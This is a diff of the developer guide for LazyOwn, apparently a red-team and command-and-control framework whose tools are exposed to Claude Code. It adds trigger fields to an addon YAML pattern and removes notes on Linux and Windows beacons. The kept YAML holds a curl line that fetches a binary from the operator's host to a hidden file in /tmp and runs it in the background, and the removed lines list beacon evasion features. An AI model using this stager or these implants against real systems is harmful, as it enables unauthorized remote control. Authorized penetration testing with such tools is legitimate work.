@@ -12,7 +12,7 @@ Professional red-team / pentest framework:
 - **Utils** (`utils.py`): ~138 helpers (config, ANSI, NVD/ExploitAlert/PacketStorm scrapers, ARP, certs).
 - **Skills** (`skills/`): MCP server (~95 tools), autonomous daemon, hive-mind, MoE+RL SWAN, parquet KB, policy engine, Groq/Ollama agents.
 - **Extensions**: `lazyaddons/*.yaml` (declarative tools), `plugins/*.lua` (lupa), `tools/*.tool` (pwntomate auto-jobs).
-- **Linux BOF beacon**: `lazyaddons/blacksandbeacon*.yaml` — only OSS C2 with Linux BOF via ELF `dlopen`.
+- **lazyaddons**: `lazyaddons/*.yaml` — extendthe framework with yamls.
 
 MCP sits on top and exposes `lazyown_*` tools to Claude Code.
 
@@ -253,7 +253,6 @@ New helpers go here only if shared CLI↔C2. Feature-local helpers → `modules/
 | `captured_images/` | decoy site | operator review |
 | `keyword_fallback_index.json` | rag fallback (no ChromaDB) | rag_query |
 | `blacksandbeacon` | `blacksandbeacon` addon (`make`) | collab_join delivery |
-| `bof_loader` | `blacksandbeacon_bof` addon (`make bof`) | manual BOF delivery to live beacon |
 
 Before any tool: (1) `ls sessions/`, (2) read existing artefacts. If answer exists, don't re-scan.
 
@@ -387,6 +386,7 @@ lazyown_generate_report(target="...", include_timeline=True)
 lazyown_report_update(action="auto_fill")
 lazyown_misp_export()
 # CLI: collab_join <handle> [--curl]
+# CLI: explore [target]                   — coverage tree + trigger-matched addons/tools
 ```
 
 ---
@@ -423,28 +423,17 @@ Pure helpers (tested independently): `_read_json`, `_read_recent_commands`, `_co
 
 ---
 
-## 15c. Beacon family
 
-| Beacon | File | OS | BOF | Notes |
-|--------|------|----|-----|-------|
-| Go beacon | built-in (`do_lazymsfvenom`, `lazyc2`) | Win/Lin/Mac | No | XOR 2-stage, AES-256 C2, Garble-obfuscated |
-| Windows C beacon | `lazyaddons/beacon.yaml` | Win | Yes (Early Bird APC) | Malleable C2; NT Native API |
-| **Linux C beacon** | **`lazyaddons/blacksandbeacon.yaml`** | **Linux** | **Yes (ELF dlopen)** | **Only OSS Linux BOF; direct syscalls** |
-| Linux BOF loader | `lazyaddons/blacksandbeacon_bof.yaml` | Linux | — | Delivers `.so` BOF to live beacon |
-| ARM beacon | `blackzincbeacon` (external) | ARM/IoT | Planned | Embedded |
-
-### Linux BOF contract
-- Compile PIC ELF: `gcc -shared -fPIC -nostartfiles -o mybof.so mybof.c`
-- `datap` API (`BeaconDataParse`/`Int`/`Extract`, `BeaconPrintf`, `BeaconOutput`) source-compatible w/ Windows BOF — port by swapping Win32 for Linux syscalls/libc.
-- Loaded at runtime via `dlopen`; no new process, no disk write after delivery.
-
-### Addon YAML pattern (both beacons)
+### Addon YAML pattern
 ```yaml
-install_command: make
-execute_command: git restore . ; git pull ; make && cp <binary> ../../../sessions/<binary>
-lazycommand: curl -sk "http://{lhost}:{lport}/<binary>" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
+os: linux                  # MITRE platform (any|linux|windows|macos|network|containers|saas|iaas)
+trigger: [microsoft-ds]    # nmap service names that auto-suggest this addon; [] = manual only
+tool:
+  install_command: make
+  execute_command: git restore . ; git pull ; make && cp <binary> ../../../sessions/<binary>
+  lazycommand: curl -sk "http://{lhost}:{lport}/<binary>" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
 ```
-Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode.
+Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode. `os` defaults to `any`, `trigger` to `[]` — fill them so `explore`/`recommend_next`/`suggest_next` can surface the addon against discovered services.
 
 Tests: `tests/test_blacksandbeacon_addon.py` (59 tests — YAML structure, required fields, path safety, template placeholders, no hardcoded IPs/ports).
 
